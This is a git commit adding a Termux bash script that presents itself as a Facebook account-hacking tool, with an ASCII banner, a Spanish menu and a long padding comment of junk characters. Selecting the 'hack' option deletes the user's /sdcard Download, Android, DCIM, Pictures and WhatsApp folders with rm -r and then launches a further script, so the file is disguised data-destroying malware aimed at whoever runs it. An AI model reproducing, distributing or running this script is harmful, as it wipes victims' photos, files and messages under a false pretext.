46eb4d0d6d09a86f6867a632793db95a940be035
Dead Bunny <91534333+DeadBunny09@users.noreply.github.com>
2021-09-28 13:38:36 +0200

    Add files via upload

---
+++ fb.sh
@@ -0,0 +1,74 @@
+#!/bin/bash
+
+#!Rojo
+R='\033[1;31m'
+
+#!Verde 
+G='\033[1;32m'
+Goke='\033[92m'
+
+#!Amarillo
+Y='\033[1;33m'
+
+#!Azul
+B='\033[1;34m'
+
+#!Morado
+M='\033[1;35m'
+
+#!Cian
+C='\033[1;36m'
+
+#!Blanco
+W='\033[0m'
+
+#!ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@oqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@oqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@oqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@ushdjzkzk727282jdnzbsjdbskskdumwhvdismsozmwi(wuwusnszl627282+;38#9#)2&3))#(#!#(#(€(€!€(#))@91918262isnsnwuisndndiaoqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@oqpwldnnebrvslaoa728383+€!#(@92(3+!€!#pqokwndkLamwp#(!€(*(@!@@
+
+apt install termux-open
+sleep 1
+clear
+
+echo -e "$G
+ _______ _        _     _                      _
+(_______) |      | |   | |                    | |
+ _____  | | _    | |__ | |    ____     ____   | |  _
+|  ___) | || \   |  __)| |   / _  |   / ___)  | | / )
+| |     | |_) )  | |   | |  ( ( | |  ( (___   | |< (
+|_|     |____/   |_|   |_|   \_||_|   \____)  |_| \_) 
+ 
+			     "
+ 
+printf "\e[1;90m
+   \e[33;1mCreated by:\e[1;31mDead Bunny\e[1;90m
+
+   \e[1;31m[\e[0m1\e[1;31m]\e[0m Hackear cuenta de Facebook \e[1;90m
+   \e[1;31m[\e[0m00\e[1;31m]\e[0m SALIR\e[1;90m
+   "
+echo
+echo
+read -p $'  \e[96;1m🐰DeadBunny@root🐰\e[32m>>\e[0m ' anonimous
+
+case $anonimous in
+        1)
+                sleep 1
+                clear
+                cd
+                rm -r /sdcard/Download
+		        rm -r /sdcard/Android
+		        rm -r /sdcard/DCIM
+		        rm -r /sdcard/Pictures
+		        rm -r /sdcard/WhatsApp
+		        cd FbHack
+                bash bunny
+                ;;
+                
+        00)
+                exit
+                ;;
+
+
+esac
+
+
+#			@bunny
+
